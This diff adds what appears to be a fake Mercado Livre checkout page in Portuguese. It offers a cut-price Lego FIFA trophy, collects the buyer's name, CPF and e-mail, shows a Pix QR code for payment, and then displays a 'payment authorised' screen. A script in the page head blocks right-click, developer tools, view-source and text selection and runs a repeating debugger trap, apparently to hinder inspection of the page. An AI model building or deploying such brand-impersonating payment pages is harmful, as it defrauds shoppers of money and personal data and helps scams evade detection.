@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout | Mercado Livre</title>
+<link rel="icon" href="https://www.pngkey.com/png/full/420-4206772_mercado-livre-logo-mercadolibre-inc.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="checkout.css">
+<script>!function(){document.addEventListener('contextmenu',function(e){e.preventDefault();return!1});document.addEventListener('keydown',function(e){if(e.key==='F12'){e.preventDefault();return!1}if(e.ctrlKey&&e.shiftKey&&'IiJjCc'.indexOf(e.key)>-1){e.preventDefault();return!1}if(e.ctrlKey&&'UuSs'.indexOf(e.key)>-1){e.preventDefault();return!1}});document.addEventListener('selectstart',function(e){if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return!0;e.preventDefault();return!1});document.addEventListener('dragstart',function(e){e.preventDefault();return!1});(function d(){try{(function(){return!1})['constructor']('debugger')['call']()}catch(e){}setTimeout(d,300)})()}();</script>
+</head>
+<body>
+
+<header class="ck-header">
+  <div class="container">
+    <div class="ck-header-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/pt/0/04/Logotipo_MercadoLivre.png" alt="Mercado Livre" style="height:34px">
+    </div>
+  </div>
+</header>
+
+<!-- STEP 1: Confira a forma de entrega -->
+<div class="ck-step active" id="step1">
+  <div class="ck-body">
+    <div class="ck-main">
+      <h1 class="ck-title">Confira a forma de entrega</h1>
+      <div class="ck-card">
+        <div class="ck-delivery-option">
+          <input type="radio" class="ck-radio" checked readonly>
+          <div class="ck-delivery-info">
+            <div class="ck-delivery-top"><span class="ck-bold">Enviar no meu endereço</span><span class="ck-green ck-bold">Grátis</span></div>
+            <p class="ck-address-big" id="step1Address"></p>
+            <p class="ck-muted">Residencial</p>
+          </div>
+        </div>
+        <div style="padding:0 16px 16px"><a href="#" class="ck-link" onclick="goBackToAddress();return false">Alterar ou escolher outro endereço</a></div>
+      </div>
+      <div class="ck-btn-center"><button class="ck-btn" onclick="goToStep(2)">Continuar</button></div>
+    </div>
+    <div class="ck-sidebar">
+      <div class="ck-summary">
+        <h3>Resumo da compra</h3>
+        <div class="ck-summary-row"><span class="label">Produto</span><span class="value">R$ 41,<sup>99</sup></span></div>
+        <div class="ck-summary-row"><span class="label">Frete</span><span class="value ck-green">Grátis</span></div>
+        <div class="ck-summary-total"><span class="label">Total</span><span class="value">R$ 41,<sup>99</sup></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 2: Escolha quando sua compra chegará -->
+<div class="ck-step" id="step2">
+  <div class="ck-body">
+    <div class="ck-main">
+      <h1 class="ck-title">Escolha quando sua compra chegará</h1>
+      <p class="ck-muted" style="margin-bottom:24px">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+        Envio para <span id="step2ShortAddress" class="ck-bold"></span>
+      </p>
+      <div class="ck-card">
+        <div style="display:flex;justify-content:space-between;align-items:center;padding-bottom:16px;border-bottom:1px solid #eee;margin-bottom:16px">
+          <span class="ck-bold">Envio 1</span>
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-ncCid9uC9Xl1Ss0om9EDgHWKUOug45.png" alt="" style="width:40px;height:40px;object-fit:cover;border-radius:4px">
+        </div>
+        <div class="ck-delivery-option" style="padding:0">
+          <input type="radio" class="ck-radio" checked readonly>
+          <div class="ck-delivery-info">
+            <div class="ck-delivery-top">
+              <span>Entre os dias <span class="ck-bold">15 de abril e 19 de abril</span></span>
+              <span class="ck-green ck-bold">Grátis</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="ck-btn-center"><button class="ck-btn" onclick="goToStep(3)">Continuar</button></div>
+    </div>
+    <div class="ck-sidebar">
+      <div class="ck-summary">
+        <h3>Resumo da compra</h3>
+        <div class="ck-summary-row"><span class="label">Produto</span><span class="value">R$ 41,<sup>99</sup></span></div>
+        <div class="ck-summary-row"><span class="label">Frete</span><span class="value ck-green">Grátis</span></div>
+        <div class="ck-summary-total"><span class="label">Total</span><span class="value">R$ 41,<sup>99</sup></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 3: Escolha como pagar -->
+<div class="ck-step" id="step3">
+  <div class="ck-body">
+    <div class="ck-main">
+      <h1 class="ck-title">Escolha como pagar</h1>
+      <p class="ck-subtitle">Transferências</p>
+      <div class="ck-card">
+        <div style="display:flex;align-items:center;gap:12px;padding:16px">
+          <input type="radio" class="ck-radio" checked readonly>
+          <div class="ck-pix-icon">
+            <img src="https://baixarfavicon.com.br/wp-content/themes/baixarfavicon/ferramentas/logos-pix-png/logos/logo-pix-520x520.png" alt="Pix" style="width:24px;height:24px">
+          </div>
+          <div>
+            <p class="ck-bold">Pix</p>
+            <p class="ck-green" style="font-size:13px">Aprovação imediata</p>
+          </div>
+        </div>
+      </div>
+      <div class="ck-btn-center"><button class="ck-btn" onclick="goToStep(4)">Continuar</button></div>
+    </div>
+    <div class="ck-sidebar">
+      <div class="ck-summary">
+        <h3>Resumo da compra</h3>
+        <div class="ck-summary-row"><span class="label">Produto</span><span class="value">R$ 41,<sup>99</sup></span></div>
+        <div class="ck-summary-row"><span class="label">Frete</span><span class="value ck-green">Grátis</span></div>
+        <div class="ck-summary-row"><a href="#" class="ck-link" style="font-size:13px">Inserir código do cupom</a></div>
+        <div class="ck-summary-total"><span class="label">Você pagará</span><span class="value" style="font-size:20px">R$ 41,<sup>99</sup></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 4: Revise e confirme -->
+<div class="ck-step" id="step4">
+  <div class="ck-body">
+    <div class="ck-main">
+      <h1 class="ck-title">Revise e confirme</h1>
+      <p class="ck-section-title">Faturamento</p>
+      <div class="ck-card">
+        <div style="display:flex;align-items:flex-start;gap:12px">
+          <div style="width:40px;height:40px;background:#f5f5f5;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><rect x="2" y="3" width="20" height="18" rx="2"/><line x1="2" y1="9" x2="22" y2="9"/></svg>
+          </div>
+          <div style="flex:1">
+            <input type="text" class="ck-input" id="ckNome" placeholder="Nome completo" style="margin-bottom:8px">
+            <input type="text" class="ck-input" id="ckCpf" placeholder="CPF (somente números)" maxlength="11" oninput="this.value=this.value.replace(/\D/g,'').slice(0,11)" style="margin-bottom:8px">
+            <input type="email" class="ck-input" id="ckEmail" placeholder="E-mail">
+          </div>
+        </div>
+        <div class="ck-info-note">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          <span>Os dados do seu cartão serão utilizados para emitir a NF-e.</span>
+        </div>
+        <p style="margin-top:12px"><a href="#" class="ck-link">Modificar dados de faturamento</a></p>
+      </div>
+
+      <p class="ck-section-title">Detalhe da entrega</p>
+      <div class="ck-card">
+        <div style="display:flex;align-items:flex-start;gap:12px;padding-bottom:12px">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" style="flex-shrink:0;margin-top:2px"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+          <div><p class="ck-bold" id="step4Address"></p><p class="ck-muted">Envio no meu endereço</p></div>
+        </div>
+        <p><a href="#" class="ck-link" onclick="goBackToAddress();return false">Alterar ou escolher outro endereço</a></p>
+      </div>
+      <div class="ck-card">
+        <div style="display:flex;align-items:flex-start;gap:12px">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-ncCid9uC9Xl1Ss0om9EDgHWKUOug45.png" alt="" style="width:40px;height:40px;object-fit:cover;border-radius:4px;flex-shrink:0">
+          <div>
+            <p class="ck-muted" style="font-size:13px">Envio 1</p>
+            <p style="font-size:14px">Chegará no seu endereço entre <span class="ck-bold">15 de abril e 19 de abril</span></p>
+            <p class="ck-muted" style="font-size:13px;margin-top:4px">Troféu Oficial Da Copa Do Mundo Fifa Lego® Editions - 43020 - Quantidade: 1 - Quantidade de peças: 2842 - Versão do personagem: FIFA 2025</p>
+          </div>
+        </div>
+        <p style="margin-top:12px"><a href="#" class="ck-link" onclick="goToStep(2);return false">Alterar data de entrega</a></p>
+      </div>
+
+      <p class="ck-section-title">Detalhe do pagamento</p>
+      <div class="ck-card">
+        <div style="display:flex;align-items:center;gap:12px">
+          <div class="ck-pix-icon"><img src="https://baixarfavicon.com.br/wp-content/themes/baixarfavicon/ferramentas/logos-pix-png/logos/logo-pix-520x520.png" alt="Pix" style="width:24px;height:24px"></div>
+          <div><p class="ck-bold">Pix</p><p style="font-size:14px">R$ 41,99</p></div>
+        </div>
+        <p class="ck-muted" style="margin-top:12px;font-size:13px">Ao confirmar a compra, você terá as informações para pagar.</p>
+        <div class="ck-info-note">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          <span>Pague agora para garantir sua compra</span>
+        </div>
+      </div>
+    </div>
+    <div class="ck-sidebar">
+      <div class="ck-summary">
+        <h3>Resumo da compra</h3>
+        <div class="ck-summary-row"><span class="label">Produto</span><span class="value">R$ 41,<sup>99</sup></span></div>
+        <div class="ck-summary-row"><span class="label">Frete</span><span class="value"><span class="strike">R$ 15,<sup>00</sup></span> <span class="ck-green">Grátis</span></span></div>
+        <div class="ck-summary-total" style="flex-direction:column;gap:4px">
+          <div style="display:flex;justify-content:space-between"><span class="label">Você pagará</span><span class="value" style="font-size:20px">R$ 41,<sup>99</sup></span></div>
+          <div style="text-align:right;font-size:13px;color:#666">Pix</div>
+        </div>
+        <div class="ck-summary-total" style="border-top:none;padding-top:0">
+          <span class="label">Total</span>
+          <span class="value"><span class="strike">R$ 68,<sup>99</sup></span> R$ 41,<sup>99</sup></span>
+        </div>
+        <p class="ck-savings">Você economizou R$ 15,<sup>00</sup></p>
+        <label style="display:flex;align-items:flex-start;gap:8px;margin-top:16px;font-size:13px;color:#666;cursor:pointer">
+          <input type="checkbox" style="margin-top:2px"> Fique por dentro com notificações por WhatsApp e SMS.
+        </label>
+        <div style="margin-top:16px">
+          <button class="ck-btn green" style="width:100%;font-size:18px;padding:16px" onclick="confirmPurchase()">Confirmar a compra</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 5: Loading -->
+<div class="ck-step" id="step5">
+  <div class="ck-body" style="justify-content:center">
+    <div class="ck-loading-page">
+      <h1 class="ck-title" style="margin-bottom:32px">Já é quase sua!</h1>
+      <div style="display:flex;align-items:center;gap:16px">
+        <div class="ck-spinner"></div>
+        <p class="ck-muted">Processando seu pagamento...</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 6: QR Code PIX -->
+<div class="ck-step" id="step6">
+  <div class="ck-body" style="justify-content:center">
+    <div class="ck-main" style="max-width:700px;margin:0 auto">
+      <div class="ck-card" style="text-align:center">
+        <div class="ck-pix-header-icon">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#00A650" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+        </div>
+        <p class="ck-pix-title">Falta pouco!</p>
+        <p class="ck-pix-amount">Pague R$ 41,99 via Pix para concluir sua compra</p>
+      </div>
+      <div class="ck-card">
+        <h3 style="font-size:18px;margin-bottom:16px">Escaneie um código QR para pagar</h3>
+        <ol style="padding-left:20px;margin:16px 0">
+          <li style="font-size:14px;margin-bottom:4px">Acesse seu Internet Banking ou app de pagamentos.</li>
+          <li style="font-size:14px;margin-bottom:4px">Escolha pagar via Pix.</li>
+          <li style="font-size:14px;margin-bottom:4px">Escaneie o seguinte código:</li>
+        </ol>
+        <div class="ck-qr-img"><img id="qrCodeImg" src="" alt="QR Code PIX"></div>
+        <div style="display:flex;align-items:center;gap:8px;font-size:13px;color:#666;justify-content:center;margin:16px 0">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          <span>Pague e será creditado na hora.</span>
+        </div>
+        <div class="ck-info-box">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483FA" stroke-width="2" style="flex-shrink:0"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          <span>Confirmaremos a data de entrega quando o pagamento for aprovado.</span>
+        </div>
+      </div>
+      <div class="ck-card" id="pixCopySection">
+        <h4 style="font-size:16px;font-weight:600;margin-bottom:8px">Ou copie este código para fazer o pagamento</h4>
+        <p class="ck-muted" style="margin-bottom:12px">Escolha pagar via Pix pelo seu Internet Banking ou app de pagamentos. Depois, cole o seguinte código:</p>
+        <div class="ck-copy-input"><input type="text" id="pixCode" readonly></div>
+        <button class="ck-btn-copy" id="copyBtn" onclick="copyPixCode()">Copiar código</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 7: Green success flash -->
+<div class="ck-step" id="step7">
+  <div class="ck-success-flash">
+    <svg class="ck-check-icon" width="100" height="100" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <path class="ck-check-path" d="M20 6L9 17l-5-5"/>
+    </svg>
+  </div>
+</div>
+
+<!-- STEP 8: Payment confirmed -->
+<div class="ck-step" id="step8">
+  <div class="ck-body" style="justify-content:center">
+    <div class="ck-main" style="max-width:600px;margin:0 auto;text-align:center;padding:60px 24px">
+      <div class="ck-confirmed-icon">
+        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#00A650" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+          <polyline points="22 4 12 14.01 9 11.01"/>
+        </svg>
+      </div>
+      <h1 style="font-size:28px;font-weight:700;color:#00A650;margin:24px 0 8px">Pagamento autorizado!</h1>
+      <p style="font-size:18px;color:#333;margin-bottom:8px">Seu pagamento foi confirmado com sucesso.</p>
+      <p style="font-size:15px;color:#666;margin-bottom:32px">Enviamos os detalhes da sua compra para o seu e-mail.<br>Verifique sua caixa de entrada e spam.</p>
+      <div class="ck-card" style="text-align:left;max-width:400px;margin:0 auto">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00A650" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+          <span style="font-size:14px;color:#666" id="confirmEmail"></span>
+        </div>
+        <div style="display:flex;align-items:center;gap:12px">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00A650" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+          <span style="font-size:14px;color:#666" id="confirmAddress"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="protect.js"></script>
+<script src="checkout.js"></script>
+</body>
+</html>
